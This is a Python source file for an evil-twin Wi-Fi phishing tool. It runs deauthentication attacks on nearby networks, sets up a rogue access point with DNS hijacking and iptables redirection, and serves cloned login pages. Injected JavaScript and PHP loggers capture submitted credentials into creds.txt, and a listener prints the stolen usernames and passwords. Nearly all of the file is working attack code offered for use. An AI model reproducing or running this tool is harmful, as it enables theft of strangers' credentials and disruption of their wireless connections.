import os
import sys
import time
import re
import subprocess
import requests
import shutil
import signal
from shutil import copyfile
from colorama import Fore, Style, init

init(autoreset=True)
iface2 = None
networks = []
version = "1.1"  # ← Version

def updater():
    version_url = "https://raw.githubusercontent.com/Darkhaxxor005/Wifiphisher/refs/heads/main/version.txt"

    try:
        print(f"{Fore.CYAN}→ Checking for updates...")

        response = requests.get(version_url)
        response.raise_for_status()
        remote_version = response.text.strip()

        if version != remote_version:
            print(f"{Fore.YELLOW}⚠ Update available: {Fore.GREEN}{remote_version} {Fore.YELLOW}(current: {version})")
            print(f"{Fore.CYAN}→ Updating...")

            # Clone the new repo
            subprocess.run(["git", "clone", "https://github.com/Darkhaxxor005/Wifiphisher.git"], check=True)

            # Delete old files
            if os.path.exists("wifiphisher.py"):
                os.remove("wifiphisher.py")
                print(f"{Fore.RED}✗ Deleted old {Fore.WHITE}wifiphisher.py")

            if os.path.exists("websites"):
                shutil.rmtree("websites")
                print(f"{Fore.RED}✗ Deleted old {Fore.WHITE}websites directory")

            # Move contents from cloned folder to current dir
            for item in os.listdir("Wifiphisher"):
                src = os.path.join("Wifiphisher", item)
                dst = os.path.join(os.getcwd(), item)
                shutil.move(src, dst)
            print(f"{Fore.GREEN}✓ Moved updated files to current directory")

            # Delete the cloned folder
            shutil.rmtree("Wifiphisher")
            print(f"{Fore.GREEN}✓ Cleaned up temporary update folder")

            print(f"{Fore.GREEN}✓ Update completed successfully!")
            
            os.system('sudo python wifiphisher.py')
        else:
            print(f"{Fore.GREEN}✓ Already up to date. (version: {version})")

    except requests.RequestException as e:
        print(f"{Fore.RED}✗ Failed to check version: {e}")
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}✗ Git clone failed: {e}")
    except Exception as e:
        print(f"{Fore.RED}✗ Error during update: {e}")

def get_wireless_interfaces():
    result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    interfaces = []
    for line in result.stdout.splitlines():
        if "IEEE 802.11" in line:
            iface = line.split()[0]
            interfaces.append(iface)
    return interfaces

def select_interface():
    interfaces = get_wireless_interfaces()
    if not interfaces:
        print(Fore.RED + "\n🔴 No wireless interfaces found.")
        exit(1)
    
    print(Fore.CYAN + "\n📶 Available Wireless Interfaces\n")
    for i, iface in enumerate(interfaces, 1):
        print(f"{i}. {iface}")
    
    choice = int(input(Fore.YELLOW + f"\n💡 Select interface number: {Style.RESET_ALL}"))
    return interfaces[choice - 1]

def signal_strength_color(power):
    try:
        power = int(power)
        if power >= -60:
            return Fore.GREEN + "\n🟢 Strong"
        elif -75 <= power < -60:
            return Fore.YELLOW + "\n🟡 Medium"
        else:
            return Fore.RED + "\n🔴 Weak"
    except:
        return Fore.WHITE + "\n📴 Unknown"

def scan_networks(mon_interface):
    print(Fore.GREEN + "\n🔍 Scanning for networks...")
    dump_file = "quick_scan"
    proc = subprocess.Popen([
        "sudo", "airodump-ng",
        "-w", dump_file,
        "--output-format", "csv",
        mon_interface
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(15)
    proc.send_signal(signal.SIGINT)
    time.sleep(2)

    csv_file = dump_file + "-01.csv"
    if not os.path.exists(csv_file):
        print(Fore.RED + "\n🔴 No scan results found.")
        return []

    with open(csv_file, "r", encoding="ISO-8859-1") as f:
        lines = f.readlines()

    # Skip to network section
    i = 0
    while i < len(lines) and "BSSID" not in lines[i]:
        i += 1
    i += 1  # Skip header

    print(Fore.CYAN + "\n📡 Available Wi-Fi Networks:")
    index = 1
    while i < len(lines) and lines[i].strip():
        cols = lines[i].split(",")
        if len(cols) >= 14:
            bssid = cols[0].strip()
            power = cols[8].strip()
            channel = cols[3].strip()
            essid = cols[13].strip()
            if essid:
                strength = signal_strength_color(power)
                print(f"{Fore.YELLOW}{index}. {Fore.WHITE}{essid} {Fore.MAGENTA}({bssid}) "
                      f"{Fore.BLUE}[Channel {channel}] {strength}")
                networks.append((bssid, channel, essid))
                index += 1
        i += 1

    return networks

def deauth(bssid, channel, mon_interface, count=0):
    try:
        print(Fore.CYAN + f"\n🔧 Setting channel {channel}...")
        subprocess.run(["sudo", "iwconfig", mon_interface, "channel", channel], check=True)

        print(Fore.GREEN + f"\n🔧 Launching deauth attack on {bssid} (channel {channel}) 🚨")
        subprocess.run([
            "sudo", "aireplay-ng",
            "--deauth", str(count),
            "-a", bssid,
            mon_interface
        ])
    except KeyboardInterrupt:
        print(Fore.RED + "\n🔴 Attack stopped by user.")

def enable():
    print(Fore.CYAN + "\n🎯 Enter interface for deauth attack 🔽")
    iface = select_interface()

    print(Fore.CYAN + f"\n🔧 Enabling monitor mode on {iface}...")
    subprocess.run(["sudo", "airmon-ng", "start", iface])
    mon_interface = iface + "mon"
    time.sleep(2)

    found = scan_networks(mon_interface)

    if not found:
        print(Fore.RED + "\n🔴 No networks found.")
        return

    try:
        choice = int(input(Fore.YELLOW + f"\n💡 Select network number to attack: {Style.RESET_ALL}"))
        bssid, channel, essid = found[choice - 1]
        print(Fore.GREEN + f"\n🟢 Target: {essid} ({bssid}) on channel {channel}")
        deauth(bssid, channel, mon_interface)
    except (IndexError, ValueError):
        print(Fore.RED + "\n🔴 Invalid selection.")
    finally:
        print(Fore.CYAN + "\n🔧 Stopping monitor mode...")
        subprocess.run(["sudo", "airmon-ng", "stop", mon_interface])

def clear_csv_files():
    script_dir = os.path.dirname(os.path.abspath(__file__))  # Directory of the script
    files_removed = 0

    for file in os.listdir(script_dir):
        if file.endswith('.csv'):
            file_path = os.path.join(script_dir, file)
            try:
                os.remove(file_path)
                print(Fore.GREEN + f"\n📁 Removed: {file}")
                files_removed += 1
            except Exception as e:
                print(Fore.RED + f"\n🔴 Failed to remove {file}: {e}")

    if files_removed == 0:
        print(Fore.RED + "\n🔴 No .csv files found.")
    else:
        print(Fore.GREEN + f"\n📁 Total .csv files removed: {files_removed}")
        
try:
   if '--run-deauth' in sys.argv:
       enable()
except KeyboardInterrupt:
        print(Fore.RED + "\n\n🔴 Ctrl + C triggered. Cleaning up and exiting...")
        clear_csv_files()
        time.sleep(1)
        exit()

def check():
    if os.geteuid() != 0:
       print(Fore.RED + "\n[!] Run this script as root.\n")
       sys.exit(1)
       
    updater()
       
    def is_installed_binary(cmd):
        return shutil.which(cmd) is not None

    def install(pkg):
        print(f"\n{Fore.YELLOW}⏳ Installing {pkg}...")
        subprocess.run(['sudo', 'apt', 'install', '-y', pkg])

    # Check and install hostapd
    if is_installed_binary('hostapd'):
        print(f"\n{Fore.GREEN}🟢 hostapd is already installed.")
    else:
        install('hostapd')

    # Check and install gnome-terminal
    if is_installed_binary('gnome-terminal'):
        print(f"\n{Fore.GREEN}🟢 gnome-terminal is already installed.")
    else:
        install('gnome-terminal')
        
def setup():
    global iface2
    print(f"\n{Fore.CYAN}🎯 Enter interface for fake access point 🔽")
    iface2 = select_interface()
    # User inputs
    ssid = input(f"\n{Fore.CYAN}💡 Enter SSID name: {Style.RESET_ALL}")
    inactivity = input(f"\n{Fore.CYAN}💡 Enter AP inactivity timeout (in seconds): {Style.RESET_ALL}")
    # Create hostapd.conf
    hostapd_conf = f"""interface={iface2}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
ap_max_inactivity={inactivity}
"""
    with open("hostapd.conf", "w") as f:
        f.write(hostapd_conf)
    print(f"\n{Fore.GREEN}📁 Created {Fore.YELLOW}hostapd.conf")

    # Create dnsmasq.conf
    dnsmasq_conf = """interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1

# These are the most important lines:
address=/connectivitycheck.gstatic.com/10.0.0.1
address=/clients3.google.com/10.0.0.1
address=/connectivitycheck.android.com/10.0.0.1
address=/#/10.0.0.1
"""
    with open("dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
    print(f"\n{Fore.GREEN}📁 Created {Fore.YELLOW}dnsmasq.conf")
    
    html_path = "/var/www/html"
    backup_path = os.path.join(html_path, "backup")

    # Create backup folder if it doesn't exist
    if not os.path.exists(backup_path):
        os.makedirs(backup_path)
        print(f"\n{Fore.GREEN}📁 Created backup directory: {Fore.YELLOW}{backup_path}")

    # Move all files from /var/www/html to backup
    print(f"\n{Fore.YELLOW}📁 Moving existing files to backup...")
    for item in os.listdir(html_path):
        if item != "backup":  # Avoid moving the backup folder itself
            item_path = os.path.join(html_path, item)
            shutil.move(item_path, backup_path)
    print(f"\n{Fore.GREEN}🟢 Backup complete")

    # Step 1: Write the .htaccess file
    htaccess_path = os.path.join(html_path, ".htaccess")
    htaccess_content = """RewriteEngine On
RewriteCond %{REQUEST_URI} ^/generate_204$
RewriteRule ^.*$ /index.html [L]"""
    try:
        with open(htaccess_path, "w") as f:
            f.write(htaccess_content)
        print(f"\n{Fore.GREEN}🟢 .htaccess created at {Fore.YELLOW}{htaccess_path}")
    except PermissionError:
        print(f"\n{Fore.RED}🔴 Permission denied while writing .htaccess. {Fore.RESET}Run script with sudo.")

    # Step 2: Enable Apache rewrite module
    print(f"\n{Fore.YELLOW}🔧 Enabling Apache rewrite module...")
    subprocess.run(["sudo", "a2enmod", "rewrite"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"\n{Fore.GREEN}🟢 Rewrite module enabled")

    # Step 3: Copy 000-default.conf to current directory as a backup
    original_conf = "/etc/apache2/sites-available/000-default.conf"
    copied_conf = os.path.join(os.getcwd(), "000-default.conf")
    try:
        copyfile(original_conf, copied_conf)
        print(f"\n{Fore.GREEN}🟢 Backed up {Fore.YELLOW}{original_conf} {Fore.GREEN}to current directory")
    except PermissionError:
        print(f"\n{Fore.RED}🔴 Permission denied while copying Apache config. {Fore.RESET}Run with sudo.")

    # Step 4: Overwrite the original 000-default.conf
    virtual_host_config = """<VirtualHost *:80>
    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>"""
    try:
        with open(original_conf, "w") as f:
            f.write(virtual_host_config)
        print(f"\n{Fore.GREEN}🟢 Overwritten {Fore.YELLOW}{original_conf} {Fore.GREEN}with custom <VirtualHost> block")
    except PermissionError:
        print(f"\n{Fore.RED}🔴 Failed to write to {original_conf}. {Fore.RESET}Run with sudo.")
    
def run_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
        print(f"\n{Fore.GREEN}🟢 Successfully executed: {Fore.YELLOW}{command}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}🔴 Error executing: {Fore.YELLOW}{command}{Fore.RESET}")

def engine():
    # Step 1: Stop Network Manager
    print(f"\n{Fore.YELLOW}🔧 Stopping Network Manager...")
    run_command("sudo systemctl stop NetworkManager")

    # Step 2: Start Apache2 server
    print(f"\n{Fore.YELLOW}🔧 Starting Apache2 server...")
    run_command("sudo systemctl start apache2")

    # Step 3: Set IP for wlan0 interface
    print(f"\n{Fore.YELLOW}🔧 Setting IP for wlan0...")
    run_command("sudo ip addr flush dev wlan0")
    run_command("sudo ip addr add 10.0.0.1/24 dev wlan0")
    run_command("sudo ip link set wlan0 up")

    # Step 4: Apply iptables rules
    print(f"\n{Fore.YELLOW}🔧 Applying iptables rules...")
    run_command("sudo iptables -t nat -F")
    run_command("sudo iptables -F")
    run_command("sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
    run_command("sudo iptables -A FORWARD -p tcp -d 10.0.0.1 --dport 80 -j ACCEPT")

    # Step 5: Start dnsmasq
    print(f"\n{Fore.YELLOW}🔧 Starting dnsmasq...")
    run_command("sudo dnsmasq -C dnsmasq.conf")

    # Step 6: Start hostapd
    print(f"\n{Fore.YELLOW}🔧 Starting hostapd...")
    run_command("sudo hostapd hostapd.conf -B")

    # Final confirmation
    print(f"\n{Fore.GREEN}🟢 All services started successfully. Fake AP is now running.")

        
def restore_backup():
    html_dir = "/var/www/html"
    backup_dir = os.path.join(html_dir, "backup")

    # Step 1: Clean /var/www/html except the backup folder
    print(f"\n{Fore.YELLOW}📁 Cleaning {html_dir}...")
    for item in os.listdir(html_dir):
        item_path = os.path.join(html_dir, item)
        if item != "backup":
            try:
                if os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                else:
                    os.remove(item_path)
                print(f"\n{Fore.GREEN}🟢 Removed: {Fore.YELLOW}{item_path}")
            except Exception as e:
                print(f"\n{Fore.RED}🔴 Error removing {item_path}: {e}")

    # Step 2: Restore files from backup
    if os.path.exists(backup_dir):
        print(f"\n{Fore.YELLOW}📁 Restoring backup contents...")
        for item in os.listdir(backup_dir):
            src = os.path.join(backup_dir, item)
            dst = os.path.join(html_dir, item)
            try:
                shutil.move(src, dst)
                print(f"\n{Fore.GREEN}🟢 Restored: {Fore.YELLOW}{item}")
            except Exception as e:
                print(f"\n{Fore.RED}🔴 Error restoring {item}: {e}")

        # Step 3: Remove backup folder
        try:
            shutil.rmtree(backup_dir)
            print(f"\n{Fore.GREEN}🟢 Removed backup folder")
        except Exception as e:
            print(f"\n{Fore.RED}🔴 Failed to remove backup folder: {e}")
    else:
        print(f"\n{Fore.RED}🔴 Backup folder does not exist. Nothing to restore.")

    print(f"\n{Fore.GREEN}🟢 Apache webserver restore complete.")
    
def cleanup():
    # Step 1: Stop hostapd and dnsmasq
    print(f"\n{Fore.YELLOW}🔧 Stopping hostapd and dnsmasq...")
    run_command("sudo killall hostapd dnsmasq")

    # Step 2: Stop Apache2 service
    print(f"\n{Fore.YELLOW}🔧 Stopping Apache2 service...")
    run_command("sudo systemctl stop apache2")

    # Step 3: Flush iptables rules
    print(f"\n{Fore.YELLOW}🔧 Flushing iptables rules...")
    run_command("sudo iptables -t nat -F")
    run_command("sudo iptables -F")

    # Step 4: Bring wlan0 down
    print(f"\n{Fore.YELLOW}🔧 Bringing {iface2} interface down...")
    run_command(f"sudo ifconfig {iface2} down")

    # Step 5: Start Network Manager
    print(f"\n{Fore.YELLOW}🔧 Starting Network Manager...")
    run_command("sudo systemctl start NetworkManager")

    # Step 6: Bring wlan0 up
    print(f"\n{Fore.YELLOW}🔧 Bringing {iface2} interface up...")
    run_command(f"sudo ifconfig {iface2} up")

    # Step 7: Remove hostapd.conf
    print(f"\n{Fore.YELLOW}🔧 Removing hostapd.conf...")
    run_command("sudo rm hostapd.conf")

    # Step 8: Remove dnsmasq.conf
    print(f"\n{Fore.YELLOW}🔧 Removing dnsmasq.conf...")
    run_command("sudo rm dnsmasq.conf")

    # Step 9: Remove .htaccess file from /var/www/html
    htaccess_path = "/var/www/html/.htaccess"
    if os.path.exists(htaccess_path):
        print(f"\n{Fore.YELLOW}📁 Removing .htaccess file...")
        os.remove(htaccess_path)
        print(f"\n{Fore.GREEN}🟢 .htaccess file removed")
    else:
        print(f"\n{Fore.RED}🔴 .htaccess file not found")

    # Step 10: Replace 000-default.conf with backup
    current_path = os.getcwd()
    backup_conf_path = "/etc/apache2/sites-available/000-default.conf"
    copied_conf_path = os.path.join(current_path, "000-default.conf")

    if os.path.exists(copied_conf_path):
        try:
            shutil.copy(copied_conf_path, backup_conf_path)
            print(f"\n{Fore.GREEN}🟢 Restored: {Fore.YELLOW}{backup_conf_path}")
            os.remove(copied_conf_path)
            print(f"\n{Fore.GREEN}🟢 Deleted local backup config")
        except PermissionError:
            print(f"\n{Fore.RED}🔴 Permission denied while replacing 000-default.conf. Run with sudo.")
    else:
        print(f"\n{Fore.RED}🔴 000-default.conf not found in current directory.")

    # Restore web files and clear logs
    restore_backup()
    clear_csv_files()

    print(f"\n{Fore.GREEN}🟢 Cleanup completed.")
    
def webclone():
    html_path = "/var/www/html"
    script_dir = os.path.dirname(os.path.abspath(__file__))
    websites_dir = os.path.join(script_dir, "websites")

    if not os.path.exists(websites_dir):
        print(f"\n{Fore.RED}🔴 'websites' directory not found in: {websites_dir}")
        return

    folders = sorted([d for d in os.listdir(websites_dir) if os.path.isdir(os.path.join(websites_dir, d)) and d.lower() != "default"])

    print(f"\n{Fore.CYAN}📄 Available website folders 🔽\n")
    for idx, folder in enumerate(folders, 1):
        print(f"{Fore.YELLOW}    {idx}. {folder}")

    selection = input(f"\n{Fore.CYAN}💡 Select website (leave blank for default): {Style.RESET_ALL}").strip()
    is_default = not selection

    if is_default:
        selected_path = os.path.join(websites_dir, "Default")
        print(f"\n{Fore.BLUE}🧿 Using default website")
    else:
        try:
            folder_idx = int(selection) - 1
            selected_folder = folders[folder_idx]
            selected_path = os.path.join(websites_dir, selected_folder)
            print(f"\n{Fore.GREEN}🟢 Selected website: {selected_folder}")
        except (ValueError, IndexError):
            print(f"\n{Fore.RED}🔴 Invalid selection.")
            return

    if not os.path.exists(selected_path):
        print(f"\n{Fore.RED}🔴 Selected website does not exist.")
        return

    if os.path.exists(html_path):
        for item in os.listdir(html_path):
            if item in ["backup", ".htaccess"]:
                continue
            full_path = os.path.join(html_path, item)
            if os.path.isdir(full_path):
                shutil.rmtree(full_path)
            else:
                os.remove(full_path)

    shutil.copytree(selected_path, html_path, dirs_exist_ok=True)
    print(f"\n{Fore.CYAN}📁 Copied files from '{selected_path}' to /var/www/html")

    if not is_default:
        # Create index.html with mobile detection only for custom
        index_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta charset="UTF-8">
    <script type="text/javascript">
        window.onload = function () {
            if (screen.width <= 699) {
                fetch("mobile.html", { method: "HEAD" })
                    .then(response => {
                        if (response.ok) {
                            window.location.href = "mobile.html";
                        } else {
                            window.location.href = "login.html";
                        }
                    })
                    .catch(error => {
                        window.location.href = "login.html";
                    });
            } else {
                window.location.href = "login.html";
            }
        };
    </script>
</head>
<body>
    <p>Redirecting...</p>
</body>
</html>
'''
        with open(os.path.join(html_path, "index.html"), "w") as f:
            f.write(index_html)
        print(f"\n{Fore.CYAN}📁 Created index.html")

    # Create error.html
    error_html_path = os.path.join(html_path, "error.html")
    with open(error_html_path, "w") as f:
        f.write('<h1>Something went wrong, No internet.</h1>\n')
    os.chmod(error_html_path, 0o644)

    if is_default:
        logger_php = '''<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $logFile = "creds.txt";
    $data = date("Y-m-d H:i:s") . " | ";
    foreach ($_POST as $key => $value) {
        $data .= "$key = $value; ";
    }
    $data .= "\\n";
    file_put_contents($logFile, $data, FILE_APPEND | LOCK_EX);
}
?>'''
        with open(os.path.join(html_path, "logger.php"), "w") as f:
            f.write(logger_php)

        creds_path = os.path.join(html_path, "creds.txt")
        open(creds_path, "a").close()
        os.chmod(creds_path, 0o644)
        subprocess.run(["chown", "www-data:www-data", creds_path], check=True)

        js_payload = """
<script>
document.addEventListener('DOMContentLoaded', function () {
    document.querySelectorAll('form').forEach(function (form) {
        form.addEventListener('submit', function (e) {
            e.preventDefault();
            const formData = new FormData(form);
            fetch('logger.php', {
                method: 'POST',
                body: formData
            }).then(() => {
                window.location.href = 'error.html';
            }).catch(() => {
                window.location.href = 'error.html';
            });
        });
    });
});
</script>
"""
        for root, dirs, files in os.walk(html_path):
            if 'backup' in dirs:
                dirs.remove('backup')
            for file in files:
                if file.endswith(".html"):
                    html_file = os.path.join(root, file)
                    with open(html_file, "r+", encoding="utf-8") as f:
                        content = f.read()
                        if "</body>" in content:
                            content = content.replace("</body>", js_payload + "\n</body>")
                        else:
                            content += js_payload
                        f.seek(0)
                        f.write(content)
                        f.truncate()
        print(f"\n{Fore.CYAN}📁 Created logger.php")
        print(f"\n{Fore.GREEN}🟢 Javascript payload injected")
    else:
        login_php = '''<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $logFile = "creds.txt";
    $data = date("Y-m-d H:i:s") . " | ";
    foreach ($_POST as $key => $value) {
        $data .= "$key = $value; ";
    }
    $data .= "\\n";
    file_put_contents($logFile, $data, FILE_APPEND | LOCK_EX);

    // Load fallback page
    include "error.html";
    exit();
}
?>'''
        for root, dirs, files in os.walk(html_path):
            if 'backup' in dirs:
                dirs.remove('backup')

            login_path = os.path.join(root, "login.php")
            creds_path = os.path.join(root, "creds.txt")

            with open(login_path, "w") as f:
                f.write(login_php)

            open(creds_path, "a").close()

            os.chmod(creds_path, 0o644)
            subprocess.run(["chown", "www-data:www-data", creds_path], check=True)
            subprocess.run(["chown", "www-data:www-data", login_path], check=True)

        print(f"\n{Fore.CYAN}📁 Created login.php and creds.txt")

    subprocess.run(["chown", "-R", "www-data:www-data", html_path], check=True)
    subprocess.run(["chmod", "-R", "755", html_path], check=True)
    print(f"\n{Fore.GREEN}🟢 Final permissions set. Web clone ready at {html_path}")
    
def listener():
    creds_file = "/var/www/html/creds.txt"
    seen_lines = set()

    # Keywords to identify fields
    username_keys = ["username", "user", "mail", "email", "key", "login", "log"]
    password_keys = ["pass", "password", "pwd"]

    print(f"\n{Fore.GREEN}🟢 Listening for new credentials in creds.txt...")
    print(f"\n{Fore.RED}🔴 Press Ctrl + C to exit...")

    while True:
        if os.path.exists(creds_file):
            with open(creds_file, "r") as f:
                lines = f.readlines()

            for line in lines:
                if line in seen_lines:
                    continue
                seen_lines.add(line)

                # Extract key-value pairs from the line
                creds = {}
                parts = line.strip().split(";")
                for part in parts:
                    if "=" in part:
                        key, value = part.split("=", 1)
                        creds[key.strip().lower()] = value.strip()

                # Try to extract username and password
                username = None
                password = None

                for key in creds:
                    if any(u in key for u in username_keys) and not username:
                        username = creds[key]
                    if any(p in key for p in password_keys) and not password:
                        password = creds[key]

                if username or password:
                    print(f"\n{Fore.GREEN}🟢 New Credentials Found:")
                    print(f"    {Fore.YELLOW}👉 Username: {username if username else 'N/A'}")
                    print(f"    {Fore.YELLOW}👉 Password: {password if password else 'N/A'}")

        time.sleep(1)  # Poll every 1 second

def main():
    try:
        check()
        # Check for --deauth argument and run subprocess if present
        if '--deauth' in sys.argv:
            subprocess.Popen(['gnome-terminal', '--', 'python3', sys.argv[0], '--run-deauth'])
        setup()
        time.sleep(2)
        os.system('clear')
        script_dir = os.path.dirname(os.path.realpath(__file__))
        os.chdir(script_dir)
        webclone()
        os.system('clear')
        engine()
        listener()

    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] Ctrl + C triggered. Cleaning up and exiting...")
        time.sleep(1)
        cleanup()
        exit(1)

if __name__ == "__main__":
    main()
